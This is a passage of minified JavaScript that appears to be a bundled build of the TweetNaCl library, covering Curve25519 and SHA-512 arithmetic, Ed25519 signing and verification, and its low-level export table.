                wr += Fe * Cr,
                sr += Fe * Lr,
                dr += Fe * Ur,
                nr += Fe * Dr,
                lr += Fe * Xe,
                fr += Fe * cr,
                ir += Fe * en,
                $t += Fe * jr,
                Nt += Fe * tn,
                ar += Fe * rn,
                Zt += Fe * Kt,
                Gt += Fe * Qt,
                ur += Fe * pn,
                Tr += Fe * Xr,
                Or += Fe * Fr,
                Fe = Ye[14],
                wr += Fe * Rt,
                sr += Fe * Cr,
                dr += Fe * Lr,
                nr += Fe * Ur,
                lr += Fe * Dr,
                fr += Fe * Xe,
                ir += Fe * cr,
                $t += Fe * en,
                Nt += Fe * jr,
                ar += Fe * tn,
                Zt += Fe * rn,
                Gt += Fe * Kt,
                ur += Fe * Qt,
                Tr += Fe * pn,
                Or += Fe * Xr,
                Nr += Fe * Fr,
                Fe = Ye[15],
                sr += Fe * Rt,
                dr += Fe * Cr,
                nr += Fe * Lr,
                lr += Fe * Ur,
                fr += Fe * Dr,
                ir += Fe * Xe,
                $t += Fe * cr,
                Nt += Fe * en,
                ar += Fe * jr,
                Zt += Fe * tn,
                Gt += Fe * rn,
                ur += Fe * Kt,
                Tr += Fe * Qt,
                Or += Fe * pn,
                Nr += Fe * Xr,
                Br += Fe * Fr,
                wt += 38 * dr,
                At += 38 * nr,
                St += 38 * lr,
                Tt += 38 * fr,
                er += 38 * ir,
                Xt += 38 * $t,
                pr += 38 * Nt,
                or += 38 * ar,
                yr += 38 * Zt,
                vr += 38 * Gt,
                gr += 38 * ur,
                Sr += 38 * Tr,
                br += 38 * Or,
                _r += 38 * Nr,
                wr += 38 * Br,
                ut = 1,
                Fe = wt + ut + 65535,
                ut = Math.floor(Fe / 65536),
                wt = Fe - ut * 65536,
                Fe = At + ut + 65535,
                ut = Math.floor(Fe / 65536),
                At = Fe - ut * 65536,
                Fe = St + ut + 65535,
                ut = Math.floor(Fe / 65536),
                St = Fe - ut * 65536,
                Fe = Tt + ut + 65535,
                ut = Math.floor(Fe / 65536),
                Tt = Fe - ut * 65536,
                Fe = er + ut + 65535,
                ut = Math.floor(Fe / 65536),
                er = Fe - ut * 65536,
                Fe = Xt + ut + 65535,
                ut = Math.floor(Fe / 65536),
                Xt = Fe - ut * 65536,
                Fe = pr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                pr = Fe - ut * 65536,
                Fe = or + ut + 65535,
                ut = Math.floor(Fe / 65536),
                or = Fe - ut * 65536,
                Fe = yr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                yr = Fe - ut * 65536,
                Fe = vr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                vr = Fe - ut * 65536,
                Fe = gr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                gr = Fe - ut * 65536,
                Fe = Sr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                Sr = Fe - ut * 65536,
                Fe = br + ut + 65535,
                ut = Math.floor(Fe / 65536),
                br = Fe - ut * 65536,
                Fe = _r + ut + 65535,
                ut = Math.floor(Fe / 65536),
                _r = Fe - ut * 65536,
                Fe = wr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                wr = Fe - ut * 65536,
                Fe = sr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                sr = Fe - ut * 65536,
                wt += ut - 1 + 37 * (ut - 1),
                ut = 1,
                Fe = wt + ut + 65535,
                ut = Math.floor(Fe / 65536),
                wt = Fe - ut * 65536,
                Fe = At + ut + 65535,
                ut = Math.floor(Fe / 65536),
                At = Fe - ut * 65536,
                Fe = St + ut + 65535,
                ut = Math.floor(Fe / 65536),
                St = Fe - ut * 65536,
                Fe = Tt + ut + 65535,
                ut = Math.floor(Fe / 65536),
                Tt = Fe - ut * 65536,
                Fe = er + ut + 65535,
                ut = Math.floor(Fe / 65536),
                er = Fe - ut * 65536,
                Fe = Xt + ut + 65535,
                ut = Math.floor(Fe / 65536),
                Xt = Fe - ut * 65536,
                Fe = pr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                pr = Fe - ut * 65536,
                Fe = or + ut + 65535,
                ut = Math.floor(Fe / 65536),
                or = Fe - ut * 65536,
                Fe = yr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                yr = Fe - ut * 65536,
                Fe = vr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                vr = Fe - ut * 65536,
                Fe = gr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                gr = Fe - ut * 65536,
                Fe = Sr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                Sr = Fe - ut * 65536,
                Fe = br + ut + 65535,
                ut = Math.floor(Fe / 65536),
                br = Fe - ut * 65536,
                Fe = _r + ut + 65535,
                ut = Math.floor(Fe / 65536),
                _r = Fe - ut * 65536,
                Fe = wr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                wr = Fe - ut * 65536,
                Fe = sr + ut + 65535,
                ut = Math.floor(Fe / 65536),
                sr = Fe - ut * 65536,
                wt += ut - 1 + 37 * (ut - 1),
                Ge[0] = wt,
                Ge[1] = At,
                Ge[2] = St,
                Ge[3] = Tt,
                Ge[4] = er,
                Ge[5] = Xt,
                Ge[6] = pr,
                Ge[7] = or,
                Ge[8] = yr,
                Ge[9] = vr,
                Ge[10] = gr,
                Ge[11] = Sr,
                Ge[12] = br,
                Ge[13] = _r,
                Ge[14] = wr,
                Ge[15] = sr
            }
            function Ie(Ge, Ye) {
                Pe(Ge, Ye, Ye)
            }
            function Te(Ge, Ye) {
                var it = j(), Fe;
                for (Fe = 0; Fe < 16; Fe++)
                    it[Fe] = Ye[Fe];
                for (Fe = 253; Fe >= 0; Fe--)
                    Ie(it, it),
                    Fe !== 2 && Fe !== 4 && Pe(it, it, Ye);
                for (Fe = 0; Fe < 16; Fe++)
                    Ge[Fe] = it[Fe]
            }
            function Le(Ge, Ye) {
                var it = j(), Fe;
                for (Fe = 0; Fe < 16; Fe++)
                    it[Fe] = Ye[Fe];
                for (Fe = 250; Fe >= 0; Fe--)
                    Ie(it, it),
                    Fe !== 1 && Pe(it, it, Ye);
                for (Fe = 0; Fe < 16; Fe++)
                    Ge[Fe] = it[Fe]
            }
            function Ze(Ge, Ye, it) {
                var Fe = new Uint8Array(32), ut = new Float64Array(80), wt, At, St = j(), Tt = j(), er = j(), Xt = j(), pr = j(), or = j();
                for (At = 0; At < 31; At++)
                    Fe[At] = Ye[At];
                for (Fe[31] = Ye[31] & 127 | 64,
                Fe[0] &= 248,
                ve(ut, it),
                At = 0; At < 16; At++)
                    Tt[At] = ut[At],
                    Xt[At] = St[At] = er[At] = 0;
                for (St[0] = Xt[0] = 1,
                At = 254; At >= 0; --At)
                    wt = Fe[At >>> 3] >>> (At & 7) & 1,
                    de(St, Tt, wt),
                    de(er, Xt, wt),
                    ge(pr, St, er),
                    Re(St, St, er),
                    ge(er, Tt, Xt),
                    Re(Tt, Tt, Xt),
                    Ie(Xt, pr),
                    Ie(or, St),
                    Pe(St, er, St),
                    Pe(er, Tt, pr),
                    ge(pr, St, er),
                    Re(St, St, er),
                    Ie(Tt, St),
                    Re(er, Xt, or),
                    Pe(St, er, Y),
                    ge(St, St, Xt),
                    Pe(er, er, St),
                    Pe(St, Xt, or),
                    Pe(Xt, Tt, ut),
                    Ie(Tt, pr),
                    de(St, Tt, wt),
                    de(er, Xt, wt);
                for (At = 0; At < 16; At++)
                    ut[At + 16] = St[At],
                    ut[At + 32] = er[At],
                    ut[At + 48] = Tt[At],
                    ut[At + 64] = Xt[At];
                var yr = ut.subarray(32)
                  , vr = ut.subarray(16);
                return Te(yr, yr),
                Pe(vr, vr, yr),
                re(Ge, vr),
                0
            }
            function $e(Ge, Ye) {
                return Ze(Ge, Ye, w)
            }
            function Ne(Ge, Ye) {
                return O(Ye, 32),
                $e(Ge, Ye)
            }
            function qe(Ge, Ye, it) {
                var Fe = new Uint8Array(32);
                return Ze(Fe, it, Ye),
                ye(Ge, x, Fe, be)
            }
            var Ve = U
              , lt = Z;
            function nt(Ge, Ye, it, Fe, ut, wt) {
                var At = new Uint8Array(32);
                return qe(At, ut, wt),
                Ve(Ge, Ye, it, Fe, At)
            }
            function je(Ge, Ye, it, Fe, ut, wt) {
                var At = new Uint8Array(32);
                return qe(At, ut, wt),
                lt(Ge, Ye, it, Fe, At)
            }
            var Ke = [1116352408, 3609767458, 1899447441, 602891725, 3049323471, 3964484399, 3921009573, 2173295548, 961987163, 4081628472, 1508970993, 3053834265, 2453635748, 2937671579, 2870763221, 3664609560, 3624381080, 2734883394, 310598401, 1164996542, 607225278, 1323610764, 1426881987, 3590304994, 1925078388, 4068182383, 2162078206, 991336113, 2614888103, 633803317, 3248222580, 3479774868, 3835390401, 2666613458, 4022224774, 944711139, 264347078, 2341262773, 604807628, 2007800933, 770255983, 1495990901, 1249150122, 1856431235, 1555081692, 3175218132, 1996064986, 2198950837, 2554220882, 3999719339, 2821834349, 766784016, 2952996808, 2566594879, 3210313671, 3203337956, 3336571891, 1034457026, 3584528711, 2466948901, 113926993, 3758326383, 338241895, 168717936, 666307205, 1188179964, 773529912, 1546045734, 1294757372, 1522805485, 1396182291, 2643833823, 1695183700, 2343527390, 1986661051, 1014477480, 2177026350, 1206759142, 2456956037, 344077627, 2730485921, 1290863460, 2820302411, 3158454273, 3259730800, 3505952657, 3345764771, 106217008, 3516065817, 3606008344, 3600352804, 1432725776, 4094571909, 1467031594, 275423344, 851169720, 430227734, 3100823752, 506948616, 1363258195, 659060556, 3750685593, 883997877, 3785050280, 958139571, 3318307427, 1322822218, 3812723403, 1537002063, 2003034995, 1747873779, 3602036899, 1955562222, 1575990012, 2024104815, 1125592928, 2227730452, 2716904306, 2361852424, 442776044, 2428436474, 593698344, 2756734187, 3733110249, 3204031479, 2999351573, 3329325298, 3815920427, 3391569614, 3928383900, 3515267271, 566280711, 3940187606, 3454069534, 4118630271, 4000239992, 116418474, 1914138554, 174292421, 2731055270, 289380356, 3203993006, 460393269, 320620315, 685471733, 587496836, 852142971, 1086792851, 1017036298, 365543100, 1126000580, 2618297676, 1288033470, 3409855158, 1501505948, 4234509866, 1607167915, 987167468, 1816402316, 1246189591];
            function Qe(Ge, Ye, it, Fe) {
                for (var ut = new Int32Array(16), wt = new Int32Array(16), At, St, Tt, er, Xt, pr, or, yr, vr, gr, Sr, br, _r, wr, sr, dr, nr, lr, fr, ir, $t, Nt, ar, Zt, Gt, ur, Tr = Ge[0], Or = Ge[1], Nr = Ge[2], Br = Ge[3], Rt = Ge[4], Cr = Ge[5], Lr = Ge[6], Ur = Ge[7], Dr = Ye[0], Xe = Ye[1], cr = Ye[2], en = Ye[3], jr = Ye[4], tn = Ye[5], rn = Ye[6], Kt = Ye[7], Qt = 0; Fe >= 128; ) {
                    for (fr = 0; fr < 16; fr++)
                        ir = 8 * fr + Qt,
                        ut[fr] = it[ir + 0] << 24 | it[ir + 1] << 16 | it[ir + 2] << 8 | it[ir + 3],
                        wt[fr] = it[ir + 4] << 24 | it[ir + 5] << 16 | it[ir + 6] << 8 | it[ir + 7];
                    for (fr = 0; fr < 80; fr++)
                        if (At = Tr,
                        St = Or,
                        Tt = Nr,
                        er = Br,
                        Xt = Rt,
                        pr = Cr,
                        or = Lr,
                        yr = Ur,
                        vr = Dr,
                        gr = Xe,
                        Sr = cr,
                        br = en,
                        _r = jr,
                        wr = tn,
                        sr = rn,
                        dr = Kt,
                        $t = Ur,
                        Nt = Kt,
                        ar = Nt & 65535,
                        Zt = Nt >>> 16,
                        Gt = $t & 65535,
                        ur = $t >>> 16,
                        $t = (Rt >>> 14 | jr << 18) ^ (Rt >>> 18 | jr << 14) ^ (jr >>> 9 | Rt << 23),
                        Nt = (jr >>> 14 | Rt << 18) ^ (jr >>> 18 | Rt << 14) ^ (Rt >>> 9 | jr << 23),
                        ar += Nt & 65535,
                        Zt += Nt >>> 16,
                        Gt += $t & 65535,
                        ur += $t >>> 16,
                        $t = Rt & Cr ^ ~Rt & Lr,
                        Nt = jr & tn ^ ~jr & rn,
                        ar += Nt & 65535,
                        Zt += Nt >>> 16,
                        Gt += $t & 65535,
                        ur += $t >>> 16,
                        $t = Ke[fr * 2],
                        Nt = Ke[fr * 2 + 1],
                        ar += Nt & 65535,
                        Zt += Nt >>> 16,
                        Gt += $t & 65535,
                        ur += $t >>> 16,
                        $t = ut[fr % 16],
                        Nt = wt[fr % 16],
                        ar += Nt & 65535,
                        Zt += Nt >>> 16,
                        Gt += $t & 65535,
                        ur += $t >>> 16,
                        Zt += ar >>> 16,
                        Gt += Zt >>> 16,
                        ur += Gt >>> 16,
                        nr = Gt & 65535 | ur << 16,
                        lr = ar & 65535 | Zt << 16,
                        $t = nr,
                        Nt = lr,
                        ar = Nt & 65535,
                        Zt = Nt >>> 16,
                        Gt = $t & 65535,
                        ur = $t >>> 16,
                        $t = (Tr >>> 28 | Dr << 4) ^ (Dr >>> 2 | Tr << 30) ^ (Dr >>> 7 | Tr << 25),
                        Nt = (Dr >>> 28 | Tr << 4) ^ (Tr >>> 2 | Dr << 30) ^ (Tr >>> 7 | Dr << 25),
                        ar += Nt & 65535,
                        Zt += Nt >>> 16,
                        Gt += $t & 65535,
                        ur += $t >>> 16,
                        $t = Tr & Or ^ Tr & Nr ^ Or & Nr,
                        Nt = Dr & Xe ^ Dr & cr ^ Xe & cr,
                        ar += Nt & 65535,
                        Zt += Nt >>> 16,
                        Gt += $t & 65535,
                        ur += $t >>> 16,
                        Zt += ar >>> 16,
                        Gt += Zt >>> 16,
                        ur += Gt >>> 16,
                        yr = Gt & 65535 | ur << 16,
                        dr = ar & 65535 | Zt << 16,
                        $t = er,
                        Nt = br,
                        ar = Nt & 65535,
                        Zt = Nt >>> 16,
                        Gt = $t & 65535,
                        ur = $t >>> 16,
                        $t = nr,
                        Nt = lr,
                        ar += Nt & 65535,
                        Zt += Nt >>> 16,
                        Gt += $t & 65535,
                        ur += $t >>> 16,
                        Zt += ar >>> 16,
                        Gt += Zt >>> 16,
                        ur += Gt >>> 16,
                        er = Gt & 65535 | ur << 16,
                        br = ar & 65535 | Zt << 16,
                        Or = At,
                        Nr = St,
                        Br = Tt,
                        Rt = er,
                        Cr = Xt,
                        Lr = pr,
                        Ur = or,
                        Tr = yr,
                        Xe = vr,
                        cr = gr,
                        en = Sr,
                        jr = br,
                        tn = _r,
                        rn = wr,
                        Kt = sr,
                        Dr = dr,
                        fr % 16 === 15)
                            for (ir = 0; ir < 16; ir++)
                                $t = ut[ir],
                                Nt = wt[ir],
                                ar = Nt & 65535,
                                Zt = Nt >>> 16,
                                Gt = $t & 65535,
                                ur = $t >>> 16,
                                $t = ut[(ir + 9) % 16],
                                Nt = wt[(ir + 9) % 16],
                                ar += Nt & 65535,
                                Zt += Nt >>> 16,
                                Gt += $t & 65535,
                                ur += $t >>> 16,
                                nr = ut[(ir + 1) % 16],
                                lr = wt[(ir + 1) % 16],
                                $t = (nr >>> 1 | lr << 31) ^ (nr >>> 8 | lr << 24) ^ nr >>> 7,
                                Nt = (lr >>> 1 | nr << 31) ^ (lr >>> 8 | nr << 24) ^ (lr >>> 7 | nr << 25),
                                ar += Nt & 65535,
                                Zt += Nt >>> 16,
                                Gt += $t & 65535,
                                ur += $t >>> 16,
                                nr = ut[(ir + 14) % 16],
                                lr = wt[(ir + 14) % 16],
                                $t = (nr >>> 19 | lr << 13) ^ (lr >>> 29 | nr << 3) ^ nr >>> 6,
                                Nt = (lr >>> 19 | nr << 13) ^ (nr >>> 29 | lr << 3) ^ (lr >>> 6 | nr << 26),
                                ar += Nt & 65535,
                                Zt += Nt >>> 16,
                                Gt += $t & 65535,
                                ur += $t >>> 16,
                                Zt += ar >>> 16,
                                Gt += Zt >>> 16,
                                ur += Gt >>> 16,
                                ut[ir] = Gt & 65535 | ur << 16,
                                wt[ir] = ar & 65535 | Zt << 16;
                    $t = Tr,
                    Nt = Dr,
                    ar = Nt & 65535,
                    Zt = Nt >>> 16,
                    Gt = $t & 65535,
                    ur = $t >>> 16,
                    $t = Ge[0],
                    Nt = Ye[0],
                    ar += Nt & 65535,
                    Zt += Nt >>> 16,
                    Gt += $t & 65535,
                    ur += $t >>> 16,
                    Zt += ar >>> 16,
                    Gt += Zt >>> 16,
                    ur += Gt >>> 16,
                    Ge[0] = Tr = Gt & 65535 | ur << 16,
                    Ye[0] = Dr = ar & 65535 | Zt << 16,
                    $t = Or,
                    Nt = Xe,
                    ar = Nt & 65535,
                    Zt = Nt >>> 16,
                    Gt = $t & 65535,
                    ur = $t >>> 16,
                    $t = Ge[1],
                    Nt = Ye[1],
                    ar += Nt & 65535,
                    Zt += Nt >>> 16,
                    Gt += $t & 65535,
                    ur += $t >>> 16,
                    Zt += ar >>> 16,
                    Gt += Zt >>> 16,
                    ur += Gt >>> 16,
                    Ge[1] = Or = Gt & 65535 | ur << 16,
                    Ye[1] = Xe = ar & 65535 | Zt << 16,
                    $t = Nr,
                    Nt = cr,
                    ar = Nt & 65535,
                    Zt = Nt >>> 16,
                    Gt = $t & 65535,
                    ur = $t >>> 16,
                    $t = Ge[2],
                    Nt = Ye[2],
                    ar += Nt & 65535,
                    Zt += Nt >>> 16,
                    Gt += $t & 65535,
                    ur += $t >>> 16,
                    Zt += ar >>> 16,
                    Gt += Zt >>> 16,
                    ur += Gt >>> 16,
                    Ge[2] = Nr = Gt & 65535 | ur << 16,
                    Ye[2] = cr = ar & 65535 | Zt << 16,
                    $t = Br,
                    Nt = en,
                    ar = Nt & 65535,
                    Zt = Nt >>> 16,
                    Gt = $t & 65535,
                    ur = $t >>> 16,
                    $t = Ge[3],
                    Nt = Ye[3],
                    ar += Nt & 65535,
                    Zt += Nt >>> 16,
                    Gt += $t & 65535,
                    ur += $t >>> 16,
                    Zt += ar >>> 16,
                    Gt += Zt >>> 16,
                    ur += Gt >>> 16,
                    Ge[3] = Br = Gt & 65535 | ur << 16,
                    Ye[3] = en = ar & 65535 | Zt << 16,
                    $t = Rt,
                    Nt = jr,
                    ar = Nt & 65535,
                    Zt = Nt >>> 16,
                    Gt = $t & 65535,
                    ur = $t >>> 16,
                    $t = Ge[4],
                    Nt = Ye[4],
                    ar += Nt & 65535,
                    Zt += Nt >>> 16,
                    Gt += $t & 65535,
                    ur += $t >>> 16,
                    Zt += ar >>> 16,
                    Gt += Zt >>> 16,
                    ur += Gt >>> 16,
                    Ge[4] = Rt = Gt & 65535 | ur << 16,
                    Ye[4] = jr = ar & 65535 | Zt << 16,
                    $t = Cr,
                    Nt = tn,
                    ar = Nt & 65535,
                    Zt = Nt >>> 16,
                    Gt = $t & 65535,
                    ur = $t >>> 16,
                    $t = Ge[5],
                    Nt = Ye[5],
                    ar += Nt & 65535,
                    Zt += Nt >>> 16,
                    Gt += $t & 65535,
                    ur += $t >>> 16,
                    Zt += ar >>> 16,
                    Gt += Zt >>> 16,
                    ur += Gt >>> 16,
                    Ge[5] = Cr = Gt & 65535 | ur << 16,
                    Ye[5] = tn = ar & 65535 | Zt << 16,
                    $t = Lr,
                    Nt = rn,
                    ar = Nt & 65535,
                    Zt = Nt >>> 16,
                    Gt = $t & 65535,
                    ur = $t >>> 16,
                    $t = Ge[6],
                    Nt = Ye[6],
                    ar += Nt & 65535,
                    Zt += Nt >>> 16,
                    Gt += $t & 65535,
                    ur += $t >>> 16,
                    Zt += ar >>> 16,
                    Gt += Zt >>> 16,
                    ur += Gt >>> 16,
                    Ge[6] = Lr = Gt & 65535 | ur << 16,
                    Ye[6] = rn = ar & 65535 | Zt << 16,
                    $t = Ur,
                    Nt = Kt,
                    ar = Nt & 65535,
                    Zt = Nt >>> 16,
                    Gt = $t & 65535,
                    ur = $t >>> 16,
                    $t = Ge[7],
                    Nt = Ye[7],
                    ar += Nt & 65535,
                    Zt += Nt >>> 16,
                    Gt += $t & 65535,
                    ur += $t >>> 16,
                    Zt += ar >>> 16,
                    Gt += Zt >>> 16,
                    ur += Gt >>> 16,
                    Ge[7] = Ur = Gt & 65535 | ur << 16,
                    Ye[7] = Kt = ar & 65535 | Zt << 16,
                    Qt += 128,
                    Fe -= 128
                }
                return Fe
            }
            function We(Ge, Ye, it) {
                var Fe = new Int32Array(8), ut = new Int32Array(8), wt = new Uint8Array(256), At, St = it;
                for (Fe[0] = 1779033703,
                Fe[1] = 3144134277,
                Fe[2] = 1013904242,
                Fe[3] = 2773480762,
                Fe[4] = 1359893119,
                Fe[5] = 2600822924,
                Fe[6] = 528734635,
                Fe[7] = 1541459225,
                ut[0] = 4089235720,
                ut[1] = 2227873595,
                ut[2] = 4271175723,
                ut[3] = 1595750129,
                ut[4] = 2917565137,
                ut[5] = 725511199,
                ut[6] = 4215389547,
                ut[7] = 327033209,
                Qe(Fe, ut, Ye, it),
                it %= 128,
                At = 0; At < it; At++)
                    wt[At] = Ye[St - it + At];
                for (wt[it] = 128,
                it = 256 - 128 * (it < 112 ? 1 : 0),
                wt[it - 9] = 0,
                ae(wt, it - 8, St / 536870912 | 0, St << 3),
                Qe(Fe, ut, wt, it),
                At = 0; At < 8; At++)
                    ae(Ge, 8 * At, Fe[At], ut[At]);
                return 0
            }
            function mt(Ge, Ye) {
                var it = j()
                  , Fe = j()
                  , ut = j()
                  , wt = j()
                  , At = j()
                  , St = j()
                  , Tt = j()
                  , er = j()
                  , Xt = j();
                Re(it, Ge[1], Ge[0]),
                Re(Xt, Ye[1], Ye[0]),
                Pe(it, it, Xt),
                ge(Fe, Ge[0], Ge[1]),
                ge(Xt, Ye[0], Ye[1]),
                Pe(Fe, Fe, Xt),
                Pe(ut, Ge[3], Ye[3]),
                Pe(ut, ut, V),
                Pe(wt, Ge[2], Ye[2]),
                ge(wt, wt, wt),
                Re(At, Fe, it),
                Re(St, wt, ut),
                ge(Tt, wt, ut),
                ge(er, Fe, it),
                Pe(Ge[0], At, St),
                Pe(Ge[1], er, Tt),
                Pe(Ge[2], Tt, St),
                Pe(Ge[3], At, er)
            }
            function ct(Ge, Ye, it) {
                var Fe;
                for (Fe = 0; Fe < 4; Fe++)
                    de(Ge[Fe], Ye[Fe], it)
            }
            function vt(Ge, Ye) {
                var it = j()
                  , Fe = j()
                  , ut = j();
                Te(ut, Ye[2]),
                Pe(it, Ye[0], ut),
                Pe(Fe, Ye[1], ut),
                re(Ge, Fe),
                Ge[31] ^= ie(it) << 7
            }
            function we(Ge, Ye, it) {
                var Fe, ut;
                for (te(Ge[0], b),
                te(Ge[1], X),
                te(Ge[2], X),
                te(Ge[3], b),
                ut = 255; ut >= 0; --ut)
                    Fe = it[ut / 8 | 0] >> (ut & 7) & 1,
                    ct(Ge, Ye, Fe),
                    mt(Ye, Ge),
                    mt(Ge, Ge),
                    ct(Ge, Ye, Fe)
            }
            function _e(Ge, Ye) {
                var it = [j(), j(), j(), j()];
                te(it[0], K),
                te(it[1], Q),
                te(it[2], X),
                Pe(it[3], K, Q),
                we(Ge, it, Ye)
            }
            function Ce(Ge, Ye, it) {
                var Fe = new Uint8Array(64), ut = [j(), j(), j(), j()], wt;
                for (it || O(Ye, 32),
                We(Fe, Ye, 32),
                Fe[0] &= 248,
                Fe[31] &= 127,
                Fe[31] |= 64,
                _e(ut, Fe),
                vt(Ge, ut),
                wt = 0; wt < 32; wt++)
                    Ye[wt + 32] = Ge[wt];
                return 0
            }
            var st = new Float64Array([237, 211, 245, 92, 26, 99, 18, 88, 214, 156, 247, 162, 222, 249, 222, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16]);
            function et(Ge, Ye) {
                var it, Fe, ut, wt;
                for (Fe = 63; Fe >= 32; --Fe) {
                    for (it = 0,
                    ut = Fe - 32,
                    wt = Fe - 12; ut < wt; ++ut)
                        Ye[ut] += it - 16 * Ye[Fe] * st[ut - (Fe - 32)],
                        it = Math.floor((Ye[ut] + 128) / 256),
                        Ye[ut] -= it * 256;
                    Ye[ut] += it,
                    Ye[Fe] = 0
                }
                for (it = 0,
                ut = 0; ut < 32; ut++)
                    Ye[ut] += it - (Ye[31] >> 4) * st[ut],
                    it = Ye[ut] >> 8,
                    Ye[ut] &= 255;
                for (ut = 0; ut < 32; ut++)
                    Ye[ut] -= it * st[ut];
                for (Fe = 0; Fe < 32; Fe++)
                    Ye[Fe + 1] += Ye[Fe] >> 8,
                    Ge[Fe] = Ye[Fe] & 255
            }
            function tt(Ge) {
                var Ye = new Float64Array(64), it;
                for (it = 0; it < 64; it++)
                    Ye[it] = Ge[it];
                for (it = 0; it < 64; it++)
                    Ge[it] = 0;
                et(Ge, Ye)
            }
            function He(Ge, Ye, it, Fe) {
                var ut = new Uint8Array(64), wt = new Uint8Array(64), At = new Uint8Array(64), St, Tt, er = new Float64Array(64), Xt = [j(), j(), j(), j()];
                We(ut, Fe, 32),
                ut[0] &= 248,
                ut[31] &= 127,
                ut[31] |= 64;
                var pr = it + 64;
                for (St = 0; St < it; St++)
                    Ge[64 + St] = Ye[St];
                for (St = 0; St < 32; St++)
                    Ge[32 + St] = ut[32 + St];
                for (We(At, Ge.subarray(32), it + 32),
                tt(At),
                _e(Xt, At),
                vt(Ge, Xt),
                St = 32; St < 64; St++)
                    Ge[St] = Fe[St];
                for (We(wt, Ge, it + 64),
                tt(wt),
                St = 0; St < 64; St++)
                    er[St] = 0;
                for (St = 0; St < 32; St++)
                    er[St] = At[St];
                for (St = 0; St < 32; St++)
                    for (Tt = 0; Tt < 32; Tt++)
                        er[St + Tt] += wt[St] * ut[Tt];
                return et(Ge.subarray(32), er),
                pr
            }
            function ke(Ge, Ye) {
                var it = j()
                  , Fe = j()
                  , ut = j()
                  , wt = j()
                  , At = j()
                  , St = j()
                  , Tt = j();
                return te(Ge[2], X),
                ve(Ge[1], Ye),
                Ie(ut, Ge[1]),
                Pe(wt, ut, F),
                Re(ut, ut, Ge[2]),
                ge(wt, Ge[2], wt),
                Ie(At, wt),
                Ie(St, At),
                Pe(Tt, St, At),
                Pe(it, Tt, ut),
                Pe(it, it, wt),
                Le(it, it),
                Pe(it, it, ut),
                Pe(it, it, wt),
                Pe(it, it, wt),
                Pe(Ge[0], it, wt),
                Ie(Fe, Ge[0]),
                Pe(Fe, Fe, wt),
                $(Fe, ut) && Pe(Ge[0], Ge[0], ee),
                Ie(Fe, Ge[0]),
                Pe(Fe, Fe, wt),
                $(Fe, ut) ? -1 : (ie(Ge[0]) === Ye[31] >> 7 && Re(Ge[0], b, Ge[0]),
                Pe(Ge[3], Ge[0], Ge[1]),
                0)
            }
            function Me(Ge, Ye, it, Fe) {
                var ut, wt = new Uint8Array(32), At = new Uint8Array(64), St = [j(), j(), j(), j()], Tt = [j(), j(), j(), j()];
                if (it < 64 || ke(Tt, Fe))
                    return -1;
                for (ut = 0; ut < it; ut++)
                    Ge[ut] = Ye[ut];
                for (ut = 0; ut < 32; ut++)
                    Ge[ut + 32] = Fe[ut];
                if (We(At, Ge, it),
                tt(At),
                we(St, Tt, At),
                _e(Tt, Ye.subarray(32)),
                mt(St, Tt),
                vt(wt, St),
                it -= 64,
                ue(Ye, 0, wt, 0)) {
                    for (ut = 0; ut < it; ut++)
                        Ge[ut] = 0;
                    return -1
                }
                for (ut = 0; ut < it; ut++)
                    Ge[ut] = Ye[ut + 64];
                return it
            }
            var Ue = 32
              , rt = 24
              , dt = 32
              , Et = 16
              , ft = 32
              , gt = 32
              , Yt = 32
              , Ct = 32
              , Ot = 32
              , Vt = rt
              , Pt = dt
              , Bt = Et
              , xr = 64
              , Dt = 32
              , Ft = 64
              , Mr = 32
              , at = 64;
            M.lowlevel = {
                crypto_core_hsalsa20: ye,
                crypto_stream_xor: Be,
                crypto_stream: Ee,
                crypto_stream_salsa20_xor: xe,
                crypto_stream_salsa20: Ae,
                crypto_onetimeauth: q,
                crypto_onetimeauth_verify: L,
                crypto_verify_16: oe,
                crypto_verify_32: ue,
                crypto_secretbox: U,
                crypto_secretbox_open: Z,
                crypto_scalarmult: Ze,
                crypto_scalarmult_base: $e,
                crypto_box_beforenm: qe,
                crypto_box_afternm: Ve,
                crypto_box: nt,
                crypto_box_open: je,
                crypto_box_keypair: Ne,
                crypto_hash: We,
                crypto_sign: He,
                crypto_sign_keypair: Ce,
                crypto_sign_open: Me,
                crypto_secretbox_KEYBYTES: Ue,
                crypto_secretbox_NONCEBYTES: rt,
                crypto_secretbox_ZEROBYTES: dt,
                crypto_secretbox_BOXZEROBYTES: Et,
                crypto_scalarmult_BYTES: ft,
                crypto_scalarmult_SCALARBYTES: gt,
                crypto_box_PUBLICKEYBYTES: Yt,
                crypto_box_SECRETKEYBYTES: Ct,
                crypto_box_BEFORENMBYTES: Ot,
                crypto_box_NONCEBYTES: Vt,
                crypto_box_ZEROBYTES: Pt,
                crypto_box_BOXZEROBYTES: Bt,
                crypto_sign_BYTES: xr,
                crypto_sign_PUBLICKEYBYTES: Dt,
                crypto_sign_SECRETKEYBYTES: Ft,
                crypto_sign_SEEDBYTES: Mr,
                crypto_hash_BYTES: at,
                gf: j,
                D: F,
                L: st,
                pack25519: re,
                unpack25519: ve,
                M: Pe,
                A: ge,
                S: Ie,
                Z: Re,
                pow2523: Le,
                add: mt,
                set25519: te,
                modL: et,
                scalarmult: we,
                scalarbase: _e
            };
            function ze(Ge, Ye) {
                if (Ge.length !== Ue)
                    throw new Error("bad key size");
                if (Ye.length !== rt)
                    throw new Error("bad nonce size")
            }
            function Je(Ge, Ye) {
                if (Ge.length !== Yt)
                    throw new Error("bad public key size");
                if (Ye.length !== Ct)
                    throw new Error("bad secret key size")
            }
            function ht() {
                for (var Ge = 0; Ge < arguments.length; Ge++)
                    if (!(arguments[Ge]instanceof Uint8Array))
                        throw new TypeError("unexpected type, use Uint8Array")
            }
            function _t(Ge) {
                for (var Ye = 0; Ye < Ge.length; Ye++)
                    Ge[Ye] = 0
            }
            M.randomBytes = function(Ge) {
